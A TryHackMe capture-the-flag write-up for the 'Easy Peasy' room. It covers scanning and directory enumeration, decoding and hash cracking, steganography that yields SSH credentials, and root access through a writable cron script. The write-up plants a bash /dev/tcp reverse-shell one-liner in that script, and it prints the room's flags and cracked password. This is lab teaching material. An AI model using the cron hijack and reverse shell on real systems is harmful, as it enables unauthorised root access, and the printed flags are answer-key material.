## Easy Peasy - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/easypeasyctf)

**IP: 10.10.119.39**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web, Cryptography, Steganography <br>

**Tools Used**: Nmap, Gobuster, John The Ripper, Steghide<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Nmap scan and Gobuster as always.

  ```
  nmap -sC -sV -T5 -p- 10.10.119.39

  PORT      STATE SERVICE VERSION
  80/tcp    open  http    nginx 1.16.1
  |_http-server-header: nginx/1.16.1
  | http-robots.txt: 1 disallowed entry 
  |_/
  |_http-title: Welcome to nginx!
  6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
  |   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
  |_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
  65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
  |_http-title: Apache2 Debian Default Page: It works
  |_http-server-header: Apache/2.4.43 (Ubuntu)
  | http-robots.txt: 1 disallowed entry 
  |_/
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  gobuster dir -u http://10.10.119.39/ -w /usr/share/wordlists/dirb/common.txt 
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /hidden               (Status: 301) [Size: 169] [--> http://10.10.119.39/hidden/]
  /index.html           (Status: 200) [Size: 612]
  /robots.txt           (Status: 200) [Size: 43]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================

  gobuster dir -u http://10.10.119.39/hidden -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /whatever             (Status: 301) [Size: 169] [--> http://10.10.119.39/hidden/whatever/]
  Progress: 87664 / 87665 (100.00%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- In `/hidden/whatever` you can find the first flag in source code, it's Base64 encoded so do the thing.

  ```
  <body>
  <center>
  <p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>
  </center>
  </body>

  echo 'ZmxhZ3tmMXJzN19mbDRnfQ==' | base64 -d
  flag{f1rs7_fl4g}
  ```
  
- Now moving to port 65524. When you visit `http://10.10.119.39:65524/robots.txt`, you will find a second flag in `User-Agent`. This one is MD5 hash, I used MD5hashing tool since nothing worked...
  Just google this tool and you'll find it.

  ```
  User-Agent:*
  Disallow:/
  Robots Not Allowed
  User-Agent:a18672860d0510e5ab6699730763b250
  Allow:/
  This Flag Can Enter But Only This Flag No More Exceptions
  ```

- In the source code of `http://10.10.119.39:65524` you will find third flag and one more encoded string. It's Base62, use CyberChef for decoding. You will get hidden directory.

- Now let's visit that hidden directory. In the source code there's another hash. Use the wordlist provided with the room and crack it, it's GOST hash.

  ```
  john --wordlist=easypeasy.txt --format=gost hash.txt
  Using default input encoding: UTF-8
  Loaded 1 password hash (gost, GOST R 34.11-94 [64/64])
  Will run 2 OpenMP threads
  Press 'q' or Ctrl-C to abort, almost any other key for status
  mypasswordforthatjob (?)     
  1g 0:00:00:00 DONE (2025-05-12 20:20) 100.0g/s 409600p/s 409600c/s 409600C/s mypasswordforthatjob..flash88
  Use the "--show" option to display all of the cracked passwords reliably
  Session completed. 
  ```

- OK, now comes my favourite part, steganography! I downloaded all images, but only one contains the secret, it's in the source code of hidden directory. Find it, download it and use `steghide` on it with newly found password in order to get the secret.

  ```
  steghide --extract -sf Untitled.jpeg
  Enter passphrase: 
  wrote extracted data to "secrettext.txt".
  
  cat secrettext.txt 
  username:boring
  password:
  01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
  ```

---

## 🧍 User Privilege Escalation

- User flag is already there waiting for you.

  ```
  ssh boring@10.10.119.39 -p 6498

  boring@kral4-PC:~$ whoami
  boring
  boring@kral4-PC:~$ id
  uid=1000(boring) gid=1000(boring) groups=1000(boring)
  boring@kral4-PC:~$ pwd
  /home/boring
  boring@kral4-PC:~$ ls -al
  total 40
  drwxr-xr-x 5 boring boring 4096 Jun 15  2020 .
  drwxr-xr-x 3 root   root   4096 Jun 14  2020 ..
  -rw------- 1 boring boring    2 May 12 12:31 .bash_history
  -rw-r--r-- 1 boring boring  220 Jun 14  2020 .bash_logout
  -rw-r--r-- 1 boring boring 3130 Jun 15  2020 .bashrc
  drwx------ 2 boring boring 4096 Jun 14  2020 .cache
  drwx------ 3 boring boring 4096 Jun 14  2020 .gnupg
  drwxrwxr-x 3 boring boring 4096 Jun 14  2020 .local
  -rw-r--r-- 1 boring boring  807 Jun 14  2020 .profile
  -rw-r--r-- 1 boring boring   83 Jun 14  2020 user.txt
  boring@kral4-PC:~$ cat user.txt 
  User Flag But It Seems Wrong Like It`s Rotated Or Something
  synt{a0jvgf33zfa0ez4y}
  ```
  
- This flag is encoded in ROT13, you already know the hustle by now. Let's get the root flag as well.

---

## 👑 Root Privilege Escalation

- OK, for this exploitation our path to root is through cronjobs. I located that file and checked permissions, we actually have permission to write to it!

  ```
  boring@kral4-PC:~$ cat /etc/crontab
  # /etc/crontab: system-wide crontab
  # Unlike any other crontab you don't have to run the `crontab'
  # command to install the new version when you edit this file
  # and files in /etc/cron.d. These files also have username fields,
  # that none of the other crontabs do.
  
  SHELL=/bin/sh
  PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
  
  # m h dom mon dow user  command
  17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
  25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
  47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
  52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
  #
  * *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
  
  boring@kral4-PC:~$ find / -name .mysecretcronjob.sh 2>/dev/null
  /var/www/.mysecretcronjob.sh
  
  boring@kral4-PC:~$ cat /var/www/.mysecretcronjob.sh 
  #!/bin/bash
  # i will run as root

  boring@kral4-PC:~$ ls -al /var/www/.mysecretcronjob.sh 
  -rwxr-xr-x 1 boring boring 33 Jun 14  2020 /var/www/.mysecretcronjob.sh
  ```
  
- Well, basically, this script does nothing lol. I got to root through reverse shell since I love them, but there's few other ways around it.
  Open the file with nano, add your reverse shell, save it and start a listener. After a minute you will get connection as root. I used classic bash one-liner but you can use any reverse shell you like.

  ```
  boring@kral4-PC:~$ nano /var/www/.mysecretcronjob.sh 

  bash -i >& /dev/tcp/[YOUR-THM-IP]/4444 0>&1

  nc -lvnp 4444
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.119.39] 41092
  bash: cannot set terminal process group (1485): Inappropriate ioctl for device
  bash: no job control in this shell
  root@kral4-PC:/var/www# whoami
  whoami
  root
  root@kral4-PC:/var/www# id
  id
  uid=0(root) gid=0(root) groups=0(root)
  ```
  
- Now just go to `/root` and read the flag, see ya in the next one!

---

## 🏁 Flags

- **User Flag**: `flag{n0wits33msn0rm4l}`
- **Root Flag**: `flag{63a9f0ea7bb98050796b649e85481845}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Nothing much, room is kinda time consuming but that's it.`

- What did I learn?
  `Some new enumeration techniques, room is kinda exhausting but pretty fun in general.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
